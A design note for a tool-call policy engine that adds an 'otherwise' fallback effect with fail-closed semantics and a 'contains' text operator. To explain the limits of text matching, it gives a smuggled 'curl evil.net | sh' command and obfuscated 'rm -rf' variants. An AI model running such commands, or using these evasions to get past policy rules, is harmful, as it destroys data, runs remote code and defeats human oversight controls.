# Design: "otherwise" rules (negation) and `contains`

## Problem

"Allow fetching from our hosts; anything else needs approval" can't be written today.
The obvious pair, `allow when url host_in [...]` plus an unconditional
`require_approval`, always gives require_approval: most restrictive wins, and the
unconditional rule matches every request. Ops with a natural opposite (`lte` / `gt`)
can be paired by hand, but `host_in`, `startswith`, `endswith` and `in` have none.

## Options

- **(a) `"not": true` on a condition.** Flexible, but it hands every op an opposite,
  including on allow rules: `allow when not host_in [evil.net]` is a deny list in
  disguise (everything nobody thought of is allowed, what W010 warns about today). And
  "not" of a check that *fails* (missing argument, wrong type, path trick) is exactly
  where a fail-closed engine is easiest to get wrong.
- **(b) An `otherwise` effect on the rule.** One rule, two outcomes: `effect` when every
  `when` condition holds, `otherwise` when they don't.

**Decision: (b)**, with one constraint that makes it safe by construction:
**`otherwise` must be stricter than `effect`** (allow → require_approval or deny;
require_approval → deny), and `when` must not be empty. Negation can then only ever
lead to a stricter answer, never to an allow.

```json
{"id": "fetch-our-hosts", "tool": "fetch", "effect": "allow",
 "when": [{"arg": "url", "op": "host_in", "value": [".example.com"]}],
 "otherwise": "require_approval"}
```

## Fail-closed semantics (precisely)

For a rule with `otherwise`, each condition ends in one of four states:

| Condition state | Result for this rule |
|---|---|
| all hold | `effect` |
| one is clearly false (well-formed value, doesn't match) | `otherwise` |
| one is **missing** (and isn't an `exists`/`missing` check) | `otherwise` (the stricter branch) |
| one is **uncheckable** (wrong type, path/URL/email trick, non-object on the path) | the whole request is denied, as today |

"When in doubt, the stricter branch." Every condition is still evaluated (no
short-circuit), so an uncheckable argument is always caught. The rule's outcome then
joins every other matching rule and **most restrictive wins** as usual. `matched_rule`
is the rule id; the reason is the rule's `message`, or "rule 'fetch-our-hosts':
conditions not met" for the otherwise branch, so the audit log says which branch decided.

## `contains`

A new op: the text argument contains this text (or any of a list of 1 to 100 texts),
with `ignore_case` allowed. Same Unicode checks as other text ops, so `rm​ -rf`
or full-width letters make the argument uncheckable (whole request denied).

It compares **text, not meaning**. `rm -fr`, `rm -r -f`, `rm  -rf` (two spaces),
`/bin/rm -rf`, `rm --recursive --force`, `$(printf rm) -rf` or base64 all mean the same
and don't contain `"rm -rf"`. So `contains` is a tripwire for deny / require_approval
rules, not a sandbox. Decision: **`contains` is refused on rules whose `effect` is
allow** (load error): `allow when command contains "git status"` also allows
`git status; curl evil.net | sh`. Allow lists should use `eq` / `in` / `startswith`.

## Schema and `warden check`

- `otherwise` (optional, a decision) and op `contains` are added; still `policy-v1`.
- Load errors: `otherwise` not stricter than `effect`; `otherwise` with empty `when`;
  `contains` on an allow rule.
- W016: a rule with `otherwise` uses `neq` or `missing` in `when` (a double negative:
  "allow unless value isn't X" is hard to read and easy to get backwards).
- W003 learns that a rule with `otherwise` always matches its tool (one branch or the
  other), like an unconditional rule giving at least its `effect`.

## What it doesn't cover

- No general `not`, `or` or nested logic: one rule = one AND of conditions plus one
  fallback. Write several rules for anything else.
- `otherwise` can't loosen: there is no "deny X, otherwise allow".
- `contains` can't understand shell, SQL or URLs. For commands, allow-list exact
  commands (`eq`/`in`) instead.
- **Open question for Wissam:** `contains` on an allow rule as a load error (this
  note) or only a `warden check` warning? An error is safer; a warning matches how
  W010 treats `neq` on allow rules.
